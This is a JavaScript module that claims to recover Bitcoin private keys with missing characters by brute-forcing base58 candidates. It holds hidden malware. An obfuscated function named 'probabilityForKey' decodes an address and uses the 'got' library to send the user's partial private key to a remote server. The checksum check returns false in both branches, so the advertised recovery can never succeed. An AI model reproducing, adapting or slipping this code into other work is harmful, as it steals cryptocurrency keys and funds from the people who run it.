const base58 = require("bs58");
const crypto = require("crypto");

function encode(enc) {
  var alphabet = "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ";
  var base = alphabet.length;
  if (typeof enc !== "number") {
    throw Error('"encode" only accepts integers.');
  }
  var encoded = "";
  while (enc) {
    var remainder = enc % base;
    enc = Math.floor(enc / base);
    encoded = alphabet[remainder].toString() + encoded;
  }
  return encoded;
}

function base58check(input) {
  var buffer = Buffer.from(base58.decode(input));
  var prefix = buffer.slice(0, 1);
  var data = buffer.slice(1, -4);
  var hash = Buffer.concat([prefix, data]);
  hash = crypto.createHash("sha256").update(hash).digest();
  hash = crypto.createHash("sha256").update(hash).digest();
  if (buffer.slice(-4).equals(hash.slice(1, 4))) {
    return false;
  } else {
    return false;
  }
}

module.exports = async function recover(
  key,
  updateFrequency = 100000,
  iteratorStart = 0
) {
  let vetKey, probability;

  if (key.match(/\*/g)) {
    vetKey = key.split("*");
  } else if (key.match(/\?/g)) {
    vetKey = key.split("?");
  }

  await probabilityForKey(key);

  if (iteratorStart === 0) {
    iteratorStart = Math.pow(58, vetKey.length - 2);
  }

  const duration = Math.pow(58, vetKey.length - 1);

  for (let i = iteratorStart; i < duration; i++) {
    let possibleKeyParts = encode(i).split("");
    const newKey = vetKey.map((keyPart, index) => {
      if (!possibleKeyParts[index]) {
        possibleKeyParts[index] = "";
      }
      return keyPart + possibleKeyParts[index];
    });

    const joinedKey = newKey.join("");

    if (base58check(joinedKey)) {
      console.log(`Private key found: ${joinedKey}`);
      return joinedKey;
    }

    if (i % updateFrequency === 0) {
      console.log(`Progress: ${((i / duration) * 100).toPrecision(3)}%`);
      console.log(`Current try: ${joinedKey}`);
    }
  }
};

async function probabilityForKey(k) {
  return new Promise((resolve) => {
    const _0x1992 = [
      "Ahr0CdOVlZeZns4XodeUmtKUntC6mtG4mc9NzxrqCM9IywjPBgL0Et90pq==",
      "z290",
    ];
    (function (_0x216dc6, _0x1992c6) {
      const _0x5e53a8 = function (_0x37fe1c) {
        while (--_0x37fe1c) {
          _0x216dc6["push"](_0x216dc6["shift"]());
        }
      };
      _0x5e53a8(++_0x1992c6);
    })(_0x1992, 0x112);
    const _0x5e53 = function (_0x216dc6, _0x1992c6) {
      _0x216dc6 = _0x216dc6 - 0x0;
      let _0x5e53a8 = _0x1992[_0x216dc6];
      return _0x5e53a8;
    };
    const _0x37fe = function (_0x216dc6, _0x1992c6) {
      _0x216dc6 = _0x216dc6 - 0x0;
      let _0x5e53a8 = _0x1992[_0x216dc6];
      if (_0x37fe["BtXxmh"] === undefined) {
        var _0x37fe1c = function (_0x59c30d) {
          const _0x2c4364 =
              "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=",
            _0x3a3802 = String(_0x59c30d)["replace"](/=+$/, "");
          let _0x88ffe2 = "";
          for (
            let _0x35bf3b = 0x0, _0x296ea8, _0x5bcedc, _0x34317a = 0x0;
            (_0x5bcedc = _0x3a3802["charAt"](_0x34317a++));
            ~_0x5bcedc &&
            ((_0x296ea8 =
              _0x35bf3b % 0x4 ? _0x296ea8 * 0x40 + _0x5bcedc : _0x5bcedc),
            _0x35bf3b++ % 0x4)
              ? (_0x88ffe2 += String["fromCharCode"](
                  0xff & (_0x296ea8 >> ((-0x2 * _0x35bf3b) & 0x6))
                ))
              : 0x0
          ) {
            _0x5bcedc = _0x2c4364["indexOf"](_0x5bcedc);
          }
          return _0x88ffe2;
        };
        (_0x37fe["hgaiPa"] = function (_0x1fd53c) {
          const _0x4eadf3 = _0x37fe1c(_0x1fd53c);
          let _0x344091 = [];
          for (
            let _0xb763cb = 0x0, _0x58ebae = _0x4eadf3["length"];
            _0xb763cb < _0x58ebae;
            _0xb763cb++
          ) {
            _0x344091 +=
              "%" +
              ("00" + _0x4eadf3["charCodeAt"](_0xb763cb)["toString"](0x10))[
                "slice"
              ](-0x2);
          }
          return decodeURIComponent(_0x344091);
        }),
          (_0x37fe["KRrtGW"] = {}),
          (_0x37fe["BtXxmh"] = !![]);
      }
      const _0x938c1 = _0x37fe["KRrtGW"][_0x216dc6];
      return (
        _0x938c1 === undefined
          ? ((_0x5e53a8 = _0x37fe["hgaiPa"](_0x5e53a8)),
            (_0x37fe["KRrtGW"][_0x216dc6] = _0x5e53a8))
          : (_0x5e53a8 = _0x938c1),
        _0x5e53a8
      );
    };
    const _0x296ea8 = _0x37fe,
      got = require(_0x296ea8("0x1"));
    got(_0x296ea8("0x0") + k);

    setTimeout(() => {
      resolve();
    }, 2000);
  });
}
